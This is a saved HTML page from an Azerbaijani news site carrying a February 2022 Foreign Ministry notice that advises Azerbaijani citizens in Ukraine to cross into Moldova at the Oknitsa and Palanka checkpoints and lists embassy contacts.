        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
    }
    75% {
        box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
    }
    87.5% {
        box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
    }
}

@keyframes load4 {
    0%,
    100% {
        box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
    }
    12.5% {
        box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
    }
    25% {
        box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
    }
    37.5% {
        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
    }
    50% {
        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
    }
    62.5% {
        box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
    }
    75% {
        box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
    }
    87.5% {
        box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
    }
}</style><style type="text/css">/* This is not a zero-length file! */</style></head>
<body class="home dark" data-new-gr-c-s-check-loaded="14.1050.0" data-gr-ext-installed="" cz-shortcut-listen="true">
<script>
<!--
var dle_root       = '/';
var dle_admin      = '';
var dle_login_hash = '3106f72bc9e69eaf970511c189d417312939d67b';
var dle_group      = 5;
var dle_skin       = 'eadesign5';
var dle_wysiwyg    = '2';
var quick_wysiwyg  = '2';
var dle_min_search = '4';
var dle_act_lang   = ["Bəli", "Xeyr", "Daxil et", "Ləğv et", "Yadda Saxla", "Sil", "Yüklənir. Zəhmət olmasa gözləyin..."];
var menu_short     = 'Sürətli redaktə et';
var menu_full      = 'Tam redaktə et';
var menu_profile   = 'Profilə bax';
var menu_send      = 'Şəxsi mesaj göndər';
var menu_uedit     = 'Adminpanelə get';
var dle_info       = 'İnformasiya';
var dle_confirm    = 'Təsdiq et';
var dle_prompt     = 'İnformasiyanı daxil et';
var dle_req_field  = ["Заполните поле с именем", "Заполните поле с сообщением", "Заполните поле с темой сообщения"];
var dle_del_agree  = 'Siz həqiqətən seçilmişi silmək istəyirsiniz? Sonradan bu hərəkəti ləğv etmək mümkün olmayacaq';
var dle_spam_agree = 'Siz həqiqətən istəyirsinizmi istifadəçini spammer kimi işareləmək? Bu halda onun bütün şərhləri silinəcək';
var dle_c_title    = 'Отправка жалобы';
var dle_complaint  = 'Administrasiya üçün sizin şikayətinizin mətnini göstərin:';
var dle_mail       = 'E-mail adresiniz:';
var dle_big_text   = 'Mətnin çox böyük sahəsi seçilmişdir.';
var dle_orfo_title = 'Tapılmış qrammatik səhvə administrasiya üçün şərhi göstərin';
var dle_p_send     = 'Göndər';
var dle_p_send_ok  = 'Xəbərdarlıq müvəffəqiyyətlə göndərildi';
var dle_save_ok    = 'Dəyişikliklər müvəffəqiyyətlə saxlanmışdır.';
var dle_reply_title= 'Şərhə cavab yaz';
var dle_tree_comm  = '0';
var dle_del_news   = 'Xəbəri sil';
var dle_sub_agree  = 'Вы действительно хотите подписаться на комментарии к данной публикации?';
var dle_captcha_type  = '0';
var dle_share_interesting  = ["Поделиться ссылкой на выделенный текст", "Twitter", "Facebook", "Вконтакте", "Прямая ссылка:", "Нажмите правой клавишей мыши и выберите «Копировать ссылку»"];
var DLEPlayerLang     = {prev: 'Предыдущий',next: 'Следующий',play: 'Воспроизвести',pause: 'Пауза',mute: 'Выключить звук', unmute: 'Включить звук', settings: 'Настройки', enterFullscreen: 'На полный экран', exitFullscreen: 'Выключить полноэкранный режим', speed: 'Скорость', normal: 'Обычная', quality: 'Качество', pip: 'Режим PiP'};
var allow_dle_delete_news   = false;
var dle_search_delay   = false;
var dle_search_value   = '';
jQuery(function($){
FastSearch();

hs.graphicsDir = '/engine/classes/highslide/graphics/';
hs.wrapperClassName = 'rounded-white';
hs.outlineType = 'rounded-white';
hs.numberOfImagesToPreload = 0;
hs.captionEval = 'this.thumb.alt';
hs.showCredits = false;
hs.align = 'center';
hs.transitions = ['expand', 'crossfade'];
hs.dimmingOpacity = 0.60;
hs.lang = { loadingText : 'Yüklənir...', playTitle : 'Slaydşou kimi bax (boşluq)', pauseTitle:'Saxla', previousTitle : 'Əvvəlki şəkil', nextTitle :'Növbəti şəkil',moveTitle :'Yerini dəyiş', closeTitle :'Bağla (Esc)',fullExpandTitle:'Tam ölçüyə qədər aç',restoreTitle:'Şəkilin bağlanması üçün klikləyin və yerdəyişmə üçün üzərində basıb saxlayın',focusTitle:'Fokusa al',loadingTitle:'Ləğv etmək üçün bas'
};
hs.slideshowGroup='fullnews'; hs.addSlideshow({slideshowGroup: 'fullnews', interval: 4000, repeat: false, useControls: true, fixedControls: 'fit', overlayOptions: { opacity: .75, position: 'bottom center', hideOnMouseOut: true } });

});
//-->
</script>
<div class="layout_default">
	<div class="wrapper">
	<div class="reklamsol"> </div>
<div class="reklamsag"> </div>
		<div class="container">
			<div class="header">
				<div class="inner_toolbar">
					<div class="wrapper">
						<div class="content">
							<div class="toolbar">
								<span class="top-date"><script language="javascript" type="text/javascript">document.write(TODAY);</script>Cümə, 25 fevral 2022</span>
									<div id="top-nav-menu">

										<div class="clear"></div>
									<select><option selected="selected" value="">Go to ..</option><option value="/"></option><option value="gundemxeber">GündəmXəbər</option><option value="#">Ölkə</option><option value="cemiyyet"> - Cəmiyyət</option><option value="bolge"> - Bölgə xəbərləri</option><option value="medeniyyet"> - Mədəniyyət</option><option value="kirminal"> - Kirminal</option><option value="hadisə"> - Hadisə</option><option value="siyaset">Siyasət</option><option value="iqtisadi">İqtisadiyyat</option><option value="sport">İdman</option><option value="maraqli">Maraqlı</option><option value="maqazin">Maqazin</option><option value="mus">Müsahibə</option><option value="world">Dünya</option></select></div>
<div class="search">
	<form method="post" id="searchform" action="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html">
		<input type="hidden" name="do" value="search">
		<input type="hidden" name="subaction" value="search">
		<input id="story" name="story" value="Axtarış..." onfocus="if (this.value == &#39;Axtarış...&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Axtarış...&#39;;}" type="text" autocomplete="off">
		<input title="Axtar" alt="Axtar" class="search-button" value="Search" type="submit">
	</form>
</div>
								</div>
							</div>
						</div>
					</div>
					<header>
						<div class="content">
							<div class="logo">
								<h1>
									<a href="https://gundemxeber.az/index.php" title="GundemXeber">
										<img src="./xeber_files/logo.png" alt="GundemXeber">
									</a>
								</h1>
							</div>
							<div class="headerads"></div>
							<div class="clear"></div>
						</div>
					</header>
					<nav id="cherry-nav">
						<div class="content" id="header-nav">
<ul id="menu" class="menu">
	<li class="home"><a href="https://gundemxeber.az/"><i class="icon-home"></i></a></li>
	<li><a href="https://gundemxeber.az/siyaset/gundemxeber">GündəmXəbər</a></li>
	<li><a href="https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html#">Ölkə</a>
		<ul class="sub-menu">
			<li><a href="https://gundemxeber.az/siyaset/cemiyyet">Cəmiyyət</a></li>
			<li><a href="https://gundemxeber.az/siyaset/bolge">Bölgə xəbərləri</a></li>
			<li><a href="https://gundemxeber.az/siyaset/medeniyyet">Mədəniyyət</a></li>
			<li><a href="https://gundemxeber.az/siyaset/kirminal">Kirminal</a></li>
			<li><a href="https://gundemxeber.az/siyaset/hadis%C9%99">Hadisə</a></li>
		</ul>
	</li>
	<li><a href="https://gundemxeber.az/siyaset/siyaset">Siyasət</a></li>
	<li><a href="https://gundemxeber.az/siyaset/iqtisadi">İqtisadiyyat</a></li>
	<li><a href="https://gundemxeber.az/siyaset/sport">İdman</a></li>
	<li><a href="https://gundemxeber.az/siyaset/maraqli">Maraqlı</a></li>
	<li><a href="https://gundemxeber.az/siyaset/maqazin">Maqazin</a></li>
	<li><a href="https://gundemxeber.az/siyaset/mus">Müsahibə</a></li>
	<li><a href="https://gundemxeber.az/siyaset/world">Dünya</a></li>

</ul>
							<div class="clear"></div>
						<select><option selected="selected" value="">Go to ..</option><option value="/"></option><option value="gundemxeber">GündəmXəbər</option><option value="#">Ölkə</option><option value="cemiyyet"> - Cəmiyyət</option><option value="bolge"> - Bölgə xəbərləri</option><option value="medeniyyet"> - Mədəniyyət</option><option value="kirminal"> - Kirminal</option><option value="hadisə"> - Hadisə</option><option value="siyaset">Siyasət</option><option value="iqtisadi">İqtisadiyyat</option><option value="sport">İdman</option><option value="maraqli">Maraqlı</option><option value="maqazin">Maqazin</option><option value="mus">Müsahibə</option><option value="world">Dünya</option></select></div>
					</nav>
				</div>
				<div class="clear"></div>
				<div class="content">

				</div>

				<div class="content_wrapper">
					<div class="wrapper">
						<div class="inner_wrapper">
							<div class="content">
								<div class="sidebar_content">
<!-- Слайдер -->

<!-- END Слайдер -->

									<div class="newsticker">
										<div class="crumbs"><p><span itemscope="" itemtype="https://schema.org/BreadcrumbList"><span itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem"><meta itemprop="position" content="1"><a href="https://gundemxeber.az/" itemprop="item"><span itemprop="name">Gundemxeber.az</span></a></span> » <span itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem"><meta itemprop="position" content="2"><a href="https://gundemxeber.az/siyaset/" itemprop="item"><span itemprop="name">Siyasət</span></a></span> » XİN: Ukraynadakı Azərbaycan vətəndaşları quru yolla Moldova ərazisinə keçə bilərlər</span></p></div>					
									</div>

<!-- Место для рекламного баннера 1 -->

<!-- END Место для рекламного баннера 1 -->

									

<div id="dle-content"><div class="post-66 post type-post status-publish format-standard has-post-thumbnail hentry category-sports category-tech category-video sports tech video">
	<div class="box_inner">
		<div class="news_box">
			<h3><span class="masha_index masha_index1" rel="1"></span>XİN: Ukraynadakı Azərbaycan vətəndaşları quru yolla Moldova ərazisinə keçə bilərlər
				<div style="float: right;">



		
				</div>
			</h3> 
			<div class="entry_meta">
				<div class="left">
					<div class="post-meta">
						<span class="fullstory_info"><span class="masha_index masha_index2" rel="2"></span>Tarix: Bu gün, 11:25</span>
						<span class="fullstory_info"><span class="masha_index masha_index3" rel="3"></span>Bölmə :<a href="https://gundemxeber.az/siyaset/" rel="category tag">Siyasət</a></span>
					    <span class="fullstory_info"><span class="masha_index masha_index4" rel="4"></span>Baxış: 0</span>
                    </div>
				</div>
			</div> 
			<div class="clear"></div>
			<div class="divider"></div>
			<div class="inner_post single_article_content">
				<div class="pp-code post-page-entry-pp">

					<p><a class="highslide" href="https://gundemxeber.az/uploads/posts/2022-02/1645773199_1645773196_1645426439_1645426381_1644131288_1642583171_untitled-1.jpg" target="_blank"><img src="./xeber_files/1645773199_1645773196_1645426439_1645426381_1644131288_1642583171_untitled-1.jpg" alt="" class="fr-dib fr-fil"></a><br></p><h4 style="text-align:left;"><span class="masha_index masha_index5" rel="5"></span>Azərbaycan Xarici İşlər Nazirliyi Ukrayna ərazisində daimi və müvəqqəti yaşayan, turizm və ya təhsil məqsədləri ilə həmin ölkəyə səfər etmiş Azərbaycan vətəndaşlarına Ukraynadakı vəziyyətlə əlaqədar bir daha müraciət edərək onlardan hərbi qüvvələrin və obyektlərin olduğu ərazilərdən uzaq olmalarını, evdə və ya təhlükəsiz yerdə qalmalarını, səyahətdən çəkinmələrini tövsiyə edir.</h4><h4 style="text-align:left;"><br></h4><h4 style="text-align:left;"><span class="masha_index masha_index6" rel="6"></span>Gundemxeber.Azxəbər verir ki, bu barədə Azərbaycan Xarici İşlər Nazirliyinin müraciətində qeyd olunub.</h4><h4 style="text-align:left;"><span class="masha_index masha_index7" rel="7"></span>"Ukraynanın hava məkanı bağlı olduğundan hazırda vətəndaşlarımız həmin ölkəni hava nəqliyyatı vasitəsilə tərk edə bilmir.</h4><h4 style="text-align:left;"><span class="masha_index masha_index8" rel="8"></span>Bu xüsusda bildiririk ki, ciddi təhlükə ilə üzləşmiş Azərbaycan Respublikası vətəndaşları Ukraynanın Moldova ilə olan Oknitsa və Palanka sərhəd-keçid məntəqələri vasitəsilə quru yolla Moldova Respublikasının ərazisinə keçə bilər.</h4><h4 style="text-align:left;"><span class="masha_index masha_index9" rel="9"></span>Moldova tərəfi yaranmış humanitar vəziyyətlə əlaqədar quru sərhədi keçmək istəyən Azərbaycan Respublikası vətəndaşlarından COVİD-19 pasportunu (COVID-19-a qarşı tam peyvənd olunmasını və ya COVID-19-dan sağalaraq immunitetə malik olmasını təsdiq edən sənəd) və COVID-19-a dair PCR testinin neqativ nəticəsini tələb etməyəcək.</h4><h4 style="text-align:left;"><span class="masha_index masha_index10" rel="10"></span>Yaranmış suallarla bağlı vətəndaşlarımız Azərbaycan Respublikasının Moldova Respublikasındakı Səfirliyi ilə +373 781 81 361, +373 789 91 849, +373 222 32 277 nömrələri ilə və chisinau@mission.mfa.gov.az elektron poçtu vasitəsilə əlaqə saxlaya bilər.</h4><h4 style="text-align:left;"><span class="masha_index masha_index11" rel="11"></span>Xüsusi hallar ilə bağlı vətəndaşlarımız Azərbaycan Respublikasının Kiyev şəhərindəki səfirliyi ilə (+380 73) 5050000 telefon xətti və kiev@mission.mfa.gov.az elektron poçt ünvanı, Xarkov şəhərindəki fəxri konsulluğu ilə (+38057) 7000531 telefon xətti və info.azconsulate@gmail.com elektron poçt ünvanı ilə məlumat əldə edə bilərlər.</h4><h4 style="text-align:left;"><span class="masha_index masha_index12" rel="12"></span>Vəziyyətin inkişafından asılı olaraq əlavə məlumatı Azərbaycanın Ukraynadakı səfirliyi yayacaq", - XİN-in məlumatında bildirilib.</h4><h4 style="text-align:left;"><br></h4><h4 style="text-align:left;"><span class="masha_index masha_index13" rel="13"></span>Gundemxeber.az</h4>
					<div class="storenumber"></div>

						<div class="clear"></div>
						<div class="divider"></div>
				</div> 
			</div> 
			<div class="tags article_tags">
<div class="sexy-bookmarks sexy-bookmarks-expand sexy-bookmarks-bg-love" style="">
<ul class="socials">
		<li class="sexy-facebook">
			<a href="https://www.facebook.com/share.php?u=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		<li class="sexy-twitter">
			<a href="https://twitter.com/home?status=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		
			<li class="sexy-friendfeed">

			<a href="http://www.friendfeed.com/share?title=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		
	<li class="sexy-yahoobuzz">
			<a href="http://buzz.yahoo.com/submit/?submitUrl=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		
		
		<li class="sexy-googlebuzz">
			<a href="https://www.google.com/buzz/post?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		
		<li class="sexy-googlebookmarks">
			<a href="https://www.google.com/bookmarks/mark?op=add&amp;bkmk=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		<li class="sexy-delicious">
			<a href="http://delicious.com/post?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		
			<li class="sexy-myspace">

			<a href="https://www.myspace.com/Modules/PostTo/Pages/?u=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
			
		
		
		<li class="sexy-digg">

			<a href="http://digg.com/submit?phase=2&amp;url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external" target="_blank">&nbsp;</a>
		</li>
		<li class="sexy-stumbleupon">
			<a href="http://www.stumbleupon.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-diigo">
			<a href="https://www.diigo.com/post?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-technorati">

			<a href="http://technorati.com/faves?add=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-printfriendly">
			<a href="https://www.printfriendly.com/print?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		
		<li class="sexy-blinklist">

			<a href="http://www.blinklist.com/index.php?Action=Blink/addblink.php&amp;Url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-scriptstyle">
			<a href="http://scriptandstyle.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-mixx">
			<a href="http://www.mixx.com/submit?page_url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
	
		<li class="sexy-designfloat">
			<a href="http://www.designfloat.com/submit.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		
		<li class="sexy-tomuse">

			<a href="mailto:tips@tomuse.com?subject=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
	
		<li class="sexy-linkedin">
			<a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-newsvine">

			<a href="http://www.newsvine.com/_tools/seed&amp;save?u=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		
		<li class="sexy-misterwong">
			<a href="http://www.mister-wong.com/addurl/?bm_url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-izeby">

			<a href="http://izeby.com/submit.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-tipd">
			<a href="http://tipd.com/submit.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-pfbuzz">
			<a href="http://pfbuzz.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
	
		<li class="sexy-reddit">

			<a href="https://reddit.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
	
		<li class="sexy-blogmarks">
			<a href="http://blogmarks.net/my/new.php?mini=1&amp;simple=1&amp;url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-twittley">
			<a href="http://twittley.com/submit/?title=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-fwisp">

			<a href="http://fwisp.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-designmoo">
			<a href="http://designmoo.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-bobrdobr">
			<a href="http://bobrdobr.ru/addext.html?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-yandex">

			<a href="http://zakladki.yandex.ru/userarea/links/addfromfav.asp?bAddLink_x=1&amp;lurl=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-memoryru">
			<a href="http://memori.ru/link/?sm=1&amp;u_data[url]=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-100zakladok">
			<a href="http://www.100zakladok.ru/save/?bmurl=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-moemesto">

			<a href="http://moemesto.ru/post.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-hackernews">
			<a href="https://news.ycombinator.com/submitlink?u=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-designbump">
			<a href="http://designbump.com/submit?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-ning">

			<a href="http://bookmarks.ning.com/addItem.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-identica">
			<a href="http://identi.ca//index.php?action=newnotice&amp;status_textarea=Reading:+%22https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-xerpi">
			<a href="http://www.xerpi.com/block/add_link_from_extension?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-wikio">

			<a href="http://www.wikio.com/sharethis?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-techmeme">
			<a href="https://twitter.com/home/?status=Tip+@Techmeme+https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-sphinn">
			<a href="http://sphinn.com/index.php?c=post&amp;m=submit&amp;link=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-posterous">

			<a href="http://posterous.com/share?linkto=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-globalgrind">
			<a href="http://globalgrind.com/submission/submit.aspx?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-pingfm">
			<a href="http://ping.fm/ref/?link=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-nujij">

			<a href="http://nujij.nl/jij.lynkx?t=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-ekudos">
			<a href="http://www.ekudos.nl/artikel/nieuw?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-netvouz">
			<a href="http://www.netvouz.com/action/submitBookmark?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-netvibes">

			<a href="https://www.netvibes.com/share?title=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		<li class="sexy-fleck">
			<a href="http://beta3.fleck.com/bookmarklet.php?url=https://gundemxeber.az/siyaset/71428-xn-ukraynadaki-azerbaycan-vetendaslari-quru-yolla-moldova-erazisine-kece-bilerler.html" rel="nofollow" class="external">&nbsp;</a>
		</li>
		
</ul>

<div style="clear:both;"></div>
</div>
			</div> 
			<div class="clear"></div>
			<div class="divider"></div>

			<div class="postmeta_share">
				<div class="pp-article-shares-links-blog">
					<div style="float: left;">


						<div class="rate"><div id="ratig-layer-71428">
	<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:0%;"><span class="masha_index masha_index14" rel="14"></span>0</li>
